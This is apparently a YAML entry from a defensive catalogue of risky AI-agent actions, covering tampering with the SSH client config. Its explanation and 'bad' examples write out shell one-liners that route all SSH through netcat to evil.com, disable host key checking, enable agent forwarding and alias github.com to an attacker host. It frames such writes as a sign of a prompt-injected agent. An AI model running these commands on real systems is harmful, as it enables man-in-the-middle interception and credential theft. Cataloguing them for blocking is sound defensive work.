id: "persistence-evasion/lateral-movement/ssh-config-tampering"
version: "1.0.0"
kingdom: "Persistence & Defense Evasion"
kingdom_id: 6
category: "Lateral Movement"
category_id: "6.5"
name: "SSH Client Config Tampering"
risk_level: "critical"

abstract: |
  An AI agent modifies the SSH client configuration file to disable host key
  verification, route connections through attacker-controlled proxies, or enable
  credential forwarding to untrusted hosts — enabling MITM attacks and lateral movement.

explanation: |
  The SSH client config file (`~/.ssh/config`) controls how SSH connections are
  established. Tampering with it is a powerful persistence and lateral movement
  technique because the changes affect all subsequent SSH sessions silently.

  **ProxyCommand injection** routes every SSH connection through an attacker-
  controlled host, capturing credentials and enabling MITM decryption:
  - `Host * ProxyCommand nc evil.com 2222` — all SSH via attacker's netcat listener

  **StrictHostKeyChecking bypass** disables the host key verification that
  protects against MITM attacks, making all subsequent connections vulnerable:
  - `Host *\n  StrictHostKeyChecking no\n  UserKnownHostsFile /dev/null`

  **ForwardAgent injection** enables SSH agent forwarding to untrusted hosts,
  allowing the remote host to use the agent's credentials for further lateral
  movement without ever seeing the private key:
  - `Host *.internal\n  ForwardAgent yes`

  **Host alias redirection** silently redirects named hosts to attacker-controlled
  infrastructure:
  - `Host github.com\n  HostName evil.com\n  User attacker`

  AI agents writing to this file have almost certainly been compromised via prompt
  injection or are acting on malicious instructions. The file is user-writable by
  default and changes take effect immediately on the next SSH invocation.

recommendation: |
  - Block all writes to the SSH client config file from AI agents.
  - The config file should only be modified by the human operator, not AI agents.
  - Use version-controlled SSH config templates and deploy via secrets management.
  - Monitor the SSH config file for unauthorized changes with file integrity monitoring.

examples:
  bad:
    - "echo 'Host * ProxyCommand nc evil.com 2222' >> ~/.ssh/config"
    - "printf 'Host *\\n  StrictHostKeyChecking no\\n' > ~/.ssh/config"
    - "printf 'Host *.internal\\n  ForwardAgent yes\\n' >> ~/.ssh/config"
    - "sed -i 's/StrictHostKeyChecking ask/StrictHostKeyChecking no/' ~/.ssh/config"
    - "tee -a ~/.ssh/config <<< 'Host * UserKnownHostsFile /dev/null'"
  good:
    - "cat ~/.ssh/config"
    - "ssh-keygen -t ed25519 -f ~/.ssh/id_ed25519"
    - "ssh-copy-id user@server"

compliance:
